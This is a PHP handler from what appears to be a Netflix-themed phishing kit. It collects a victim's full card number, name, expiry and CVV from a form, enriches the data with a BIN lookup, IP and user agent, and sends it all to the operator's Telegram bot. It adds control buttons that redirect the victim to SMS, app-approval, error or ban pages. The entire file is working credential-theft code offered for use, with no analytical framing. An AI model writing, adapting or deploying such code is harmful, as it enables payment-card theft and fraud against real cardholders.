<?php
session_start();
include("panel.php");
include('config.php');


    $ccnumber = $_POST['creditCardNumber'];
    $fullname = $_POST['NameOnCard'];
    $exp = $_POST['creditExpirationMonth'];
    $cvv = $_POST['creditCardSecurityCode'];

// Extract the first six digits (BIN) from the credit card number
$bin = substr($ccnumber, 0, 6);

// Use the binlist.net API to retrieve BIN information
$binApiUrl = "https://lookup.binlist.net/$bin";
$binData = json_decode(file_get_contents($binApiUrl), true);

// Get the brand (e.g., Visa, MasterCard) from the binlist API response
$brand = $binData['scheme'];


    // Create the message to send to Telegram
$message = '
     📺 | ▶️  𝐍𝐄𝐓𝐅𝐋𝐈𝐗 𝐑𝐙𝐋𝐓𝐒  ▶️ | 📺
   
    ☛  💲  ☚  +𝟏 𝐂𝐂 𝐍𝐄𝐓𝐅𝐋𝐈𝐗 ☛  💲  ☚

💳 𝑭𝑼𝑳𝑳 𝑵𝑨𝑴𝑬 : ' . $fullname . '
💳 𝑪𝑪𝑵 : ' . $ccnumber . '
💳 𝑬𝒙𝒑𝒊𝒓𝒚 : ' . $exp . '
💳 𝑪𝑽𝑽 : ' . $cvv . '

🏦 𝑰𝑺𝑺𝑼𝑬𝑹 : ' . $binData['bank']['name'] . '
🏷 𝑩𝑹𝑨𝑵𝑫 : ' . $brand . '
🌐 𝑪𝑶𝑼𝑵𝑻𝑹𝒀: ' . $binData['country']['name'] . '

[🔋] 𝐓𝐈𝐄𝐑𝐒 [🔋]

📡 Adresse Ip : ' . $_SERVER['REMOTE_ADDR'] . '
🌐 City : ' . $city . '
🌐 Country : ' . $country . '
🤖 User-agent : ' . $_SERVER['HTTP_USER_AGENT'] . '
';


$app = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=app&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$sms = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=sms&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$success = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=success&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$carderror = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/ccfunctions/redirect.php?type=carderror&ip=' . urlencode(_ip()) . '&id=' . $randomId;
$banip = 'http://' . $_SERVER['HTTP_HOST'] . '/' . $folder . '/banip/banip.php?type=blocked&ip=' . urlencode(_ip()) . '&id=' . $randomId;



// Define the inline keyboard markup
$inlineKeyboard = [
    
    [
        ["text" => "𝐒𝐔𝐂𝐂𝐄𝐒𝐒✅", "url" => $success],
        ["text" => "𝐂𝐂 𝐄𝐫𝐫𝐨𝐫 💳 ❌", "url" => $carderror],

    ],
    
    
    [
        ["text" => "𝐀𝐏𝐏 🏫 ", "url" => $app],
    ],
    
    [
        ["text" => "𝐒𝐌𝐒 📲", "url" => $sms],
    ],
    [
        ["text" => "𝐁𝐚𝐧 𝐁𝐚𝐧 🚫 ", "url" => $banip],
    ],
    
];

// Convert the inline keyboard array to JSON
$keyboardMarkup = json_encode(["inline_keyboard" => $inlineKeyboard]);

// Manually create the reply_markup string
$replyMarkup = "&reply_markup=" . urlencode($keyboardMarkup);

// Construct the message with the updated reply_markup
$telegramMessage = "$message$replyMarkup";

$telegramUrl = 'https://api.telegram.org/bot'.$botToken.'/sendMessage?chat_id='.$chatId.'&text='.urlencode($message).'&parse_mode=HTML'.$replyMarkup;

$html = file_get_contents($telegramUrl);

if ($html === false) {
    // Error handling: Telegram message was not sent
    echo "404 Not Found.";
} else {
    // Success handling: Telegram message sent
    // Redirect to card.php
    header("Location: ../waiting.php?userid={$randString}&ue={$randString}");
    exit; // Ensure that the script stops executing after the redirection
}
?>